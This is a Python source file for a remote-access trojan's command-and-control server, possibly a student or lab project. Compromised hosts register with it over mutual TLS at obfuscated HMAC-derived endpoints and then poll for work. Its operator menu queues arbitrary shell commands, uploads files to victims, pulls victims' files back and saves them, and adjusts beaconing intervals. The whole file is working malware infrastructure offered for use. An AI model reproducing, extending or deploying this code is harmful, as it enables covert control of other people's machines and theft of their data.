#!/usr/bin/python3

# Purpose: Beacon C2 Server. Queues tasks for implants that call home on an interval.
#          The operator interacts via an interactive CLI; implants poll for work.
# Author: Israel Fernandez
# Date of creation: April 8, 2026

# Deliverables: Upload, Download, Execute — beacon/callback architecture



import time
import base64
import hashlib
import hmac
import os
import ssl
import threading
import uuid
from collections import defaultdict
from datetime import datetime, timezone
from flask import Flask, jsonify, request

app = Flask(__name__)

# Silence Flask HTTP log lines (still prints errors).
import logging as _logging
_logging.getLogger("werkzeug").setLevel(_logging.ERROR)

# Each implant registers with a UUID. Tasks and results are keyed by that ID.
implants = {}                              # {id: {info dict}}
task_queues = defaultdict(list)            # {id: [pending tasks]}
result_store = defaultdict(list)           # {id: [completed results]}
task_counter = 0
task_counter_lock = threading.Lock()

_DIR      = os.path.dirname(os.path.abspath(__file__))
_TARGET   = os.path.join(_DIR, "..", "Target")
CA_CERT   = os.path.join(_TARGET, "ca.crt")
SRV_CERT  = os.path.join(_TARGET, "target1.crt")
SRV_KEY   = os.path.join(_TARGET, "target1.key")

# Shared secret used to derive endpoint paths. Change this to rotate all routes.
# Must match the value in implant_beacon.py.
ENDPOINT_KEY = b"41447568f68e1377515ec0dfa4bd5918a7dcbb5cad1a901ad708a3b7e49e273bf48e850784d094a2b1bb5f460a7a891221f96699c06a0705528afd3c0f2961fd"

# Encrypt Endpoints
def _derive_endpoints(key):
    def encrypt(label):
        return hmac.new(key, label.encode(), hashlib.sha256).hexdigest()[:16]
    return {
        "register": encrypt("register"),
        "tasks":    encrypt("tasks"),
        "results":  encrypt("results"),
    }

ENDPOINT = _derive_endpoints(ENDPOINT_KEY)

SPLASH = "Welcome to Israel's RAT!"

# This is taken from https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
class bcolors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[94m'
    OKCYAN    = '\033[96m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'

def warn(msg):
    print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC} {msg}")

def err(msg):
    print(f"{bcolors.BOLD}{bcolors.FAIL}[!]{bcolors.ENDC} {msg}")

def success(msg):
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.ENDC} {msg}")

def log(msg):
    print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")

def notify(msg):
    print(f"\n{bcolors.BOLD}{bcolors.OKCYAN}[>>]{bcolors.ENDC} {msg}")

# Increment task ID
def _next_task_id():
    global task_counter
    with task_counter_lock:
        task_counter += 1
        return task_counter

# Implant register on startup to announce itself
@app.post(f"/{ENDPOINT['register']}")
def register():
    data = request.get_json()
    implant_id = data.get("id", str(uuid.uuid4()))
    implants[implant_id] = {
        "hostname": data.get("hostname", "unknown"),
        "user": data.get("user", "unknown"),
        "os": data.get("os", "unknown"),
        "registered": datetime.now(timezone.utc).isoformat(),
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    notify(f"New implant registered: {implant_id} ({implants[implant_id]['user']}@{implants[implant_id]['hostname']})")
    return jsonify({"ok": True, "id": implant_id})


# Implants will reach out here.
# Returns: task or None
@app.get(f"/{ENDPOINT['tasks']}/<implant_id>")
def get_tasks(implant_id):
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    implants[implant_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
    if task_queues[implant_id]:
        task = task_queues[implant_id].pop(0)
        return jsonify({"ok": True, "task": task})
    return jsonify({"ok": True, "task": None})


# Implants send results here.
@app.post(f"/{ENDPOINT['results']}/<implant_id>")
def post_results(implant_id):
    if implant_id not in implants:
        return jsonify({"error": "unknown implant"}), 404
    data = request.get_json()
    data["received_at"] = datetime.now(timezone.utc).isoformat()
    result_store[implant_id].append(data)
    implants[implant_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
    return jsonify({"ok": True})


# Tracks the last-seen result count per implant for change detection
_seen_result_counts = defaultdict(int)
# Holds the currently selected implant UUID so you don't re-pick every command
_selected_implant = None


def print_splash():
    bar = "-" * (len(SPLASH) + len(SPLASH) // 2)
    pad = (len(SPLASH) // 2) // 2 - 1
    print(bar)
    print("|" + " " * pad + SPLASH + " " * pad + "|")
    print(bar)
    print()


def list_implants():
    if not implants:
        warn("No implants registered yet.")
        return

    print(f"\n{'#':>3}  {'UUID':<38} {'User@Host':<30} {'Results':>7}  Last Seen")
    print("-" * 100)
    for i, (iid, info) in enumerate(implants.items(), 1):
        if iid == _selected_implant:
            marker = f"{bcolors.BOLD}*{bcolors.ENDC}"
        else:
            marker = " "

        pending = len(result_store.get(iid, []))
        if pending:
            pending_str = f"{bcolors.OKGREEN}{pending:>7}{bcolors.ENDC}" 
        else:
            pending_str = f"{'0':>7}"

        print(f"{marker}{i:>2}  {iid:<38} {info['user']}@{info['hostname']:<25} {pending_str}  {info['last_seen']}")
    print()


def pick_implant():
    global _selected_implant
    if not implants:
        warn("No implants registered yet.")
        return None

    ids = list(implants.keys())
    # Auto-select if there's only one
    if len(ids) == 1:
        _selected_implant = ids[0]

    # If we already have a valid selection, use it
    if _selected_implant and _selected_implant in implants:
        return _selected_implant

    # Otherwise prompt
    list_implants()
    try:
        idx = int(input("Select implant #: ")) - 1
        _selected_implant = ids[idx]
        return _selected_implant
    except (ValueError, IndexError):
        err("Invalid selection.")
        return None


def queue_task(implant_id, task_type, payload):
    task_id = _next_task_id()
    task = {"task_id": task_id, "type": task_type, **payload}
    task_queues[implant_id].append(task)
    log(f"Task #{task_id} ({task_type}) queued for {implant_id[:8]}...")
    return task_id


def show_results(implant_id):
    results = result_store.get(implant_id, [])
    if not results:
        warn("No results yet for this implant.")
        return

    for r in results:
        task_id = r.get("task_id", "?")
        task_type = r.get("type", "?")
        if task_type == "execute" and r.get("command"):
            cmd_info = f"  `{r['command']}`"
        else:
            cmd_info = ""
        print(f"\n{bcolors.BOLD}--- Task #{task_id} ({task_type}){cmd_info} @ {r.get('received_at', '?')} ---{bcolors.ENDC}")
        if r.get("ok"):
            if r.get("data"):
                # Download result. Decode and save to disk
                filepath = r.get("filepath", f"download_task{task_id}")
                filename = os.path.basename(filepath)
                try:
                    file_bytes = base64.b64decode(r["data"])
                    with open(filename, "wb") as f:
                        f.write(file_bytes)
                    success(f"Saved {filename} ({len(file_bytes)} bytes)")
                except OSError as e:
                    err(f"Failed to save download: {e}")
            elif r.get("output"):
                if r["output"].endswith("\n"):
                    print(r["output"], end="")
                else:
                    print("\n")
            else:
                success("OK")
        else:
            err(f"Error: {r.get('error', 'unknown')}")
    print()
    result_store[implant_id].clear()
    _seen_result_counts[implant_id] = 0

# Background thread
# Alerts the operator whenever new results arrive.
def _result_notifier():
    while True:
        time.sleep(2)
        for iid, results in result_store.items():
            current = len(results)
            if current > _seen_result_counts[iid]:
                new = current - _seen_result_counts[iid]
                info = implants.get(iid, {})
                tag = f"{info.get('user','?')}@{info.get('hostname','?')}"
                notify(f"{new} new result(s) from {bcolors.BOLD}{tag}{bcolors.ENDC}. Choose 6 to view")
                _seen_result_counts[iid] = current


def _menu(selected_tag):
    if selected_tag:
        print(f"Implant: {bcolors.BOLD}{selected_tag}{bcolors.ENDC}")
    else:
        print("Implant: (none selected)")
    print("1. List implants       2. Select implant")
    print("3. Execute command     4. Execute continuously")
    print("5. Upload file         6. View results")
    print("7. Download file       8. Set beacon interval")


def operator_loop():
    global _selected_implant
    time.sleep(1)  # let Flask print its startup banner first
    print_splash()

    notifier = threading.Thread(target=_result_notifier, daemon=True)
    notifier.start()

    while True:
        try:
            # Build the selected implant tag for the menu header
            if _selected_implant and _selected_implant in implants:
                info = implants[_selected_implant]
                tag = f"{info['user']}@{info['hostname']}"
            else:
                tag = None

            _menu(tag)
            choice = input("\nCommand> ").strip()
            if not choice:
                continue

            if choice == "1":
                list_implants()

            elif choice == "2":
                list_implants()
                ids = list(implants.keys())
                if ids:
                    try:
                        idx = int(input("Select implant #: ")) - 1
                        _selected_implant = ids[idx]
                        info = implants[_selected_implant]
                        success(f"Selected: {info['user']}@{info['hostname']}")
                    except (ValueError, IndexError):
                        err("Invalid selection.")

            elif choice == "3":
                iid = pick_implant()
                if iid:
                    cmd = input("Command to execute: ")
                    queue_task(iid, "execute", {"command": cmd})

            elif choice == "4":
                iid = pick_implant()
                if iid:
                    print("Enter commands (type 'quit' to stop):")
                    while True:
                        cmd = input(": ")
                        if cmd.lower() == "quit":
                            break
                        queue_task(iid, "execute", {"command": cmd})

            elif choice == "5":
                iid = pick_implant()
                if iid:
                    local_path = input("Local file to upload: ")
                    remote_name = input("Remote filename (blank = same name): ").strip()
                    if not remote_name:
                        remote_name = os.path.basename(local_path)
                    try:
                        with open(local_path, "rb") as f:
                            data = base64.b64encode(f.read()).decode("utf-8")
                        queue_task(iid, "upload", {"filename": remote_name, "file": data})
                    except OSError as e:
                        err(f"Failed to read {local_path}: {e}")

            elif choice == "6":
                iid = pick_implant()
                if iid:
                    show_results(iid)

            elif choice == "7":
                iid = pick_implant()
                if iid:
                    remote_path = input("Remote file path to download: ")
                    queue_task(iid, "download", {"filepath": remote_path})

            elif choice == "8":
                iid = pick_implant()
                if iid:
                    try:
                        interval = int(input("New interval (seconds): "))
                        queue_task(iid, "set_interval", {"interval": interval})
                    except ValueError:
                        err("Must be an integer.")
            else:
                warn("Invalid option.")

        except KeyboardInterrupt:
            print()
            warn("Exited successfully.")
            os._exit(0)


if __name__ == "__main__":
    cli_thread = threading.Thread(target=operator_loop, daemon=True)
    cli_thread.start() # Run the operator loop under a different thread than Flask server

    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain(SRV_CERT, SRV_KEY)
    ssl_ctx.load_verify_locations(CA_CERT)
    ssl_ctx.verify_mode = ssl.CERT_REQUIRED  # mTLS

    app.run(host="0.0.0.0", port=9443, ssl_context=ssl_ctx)
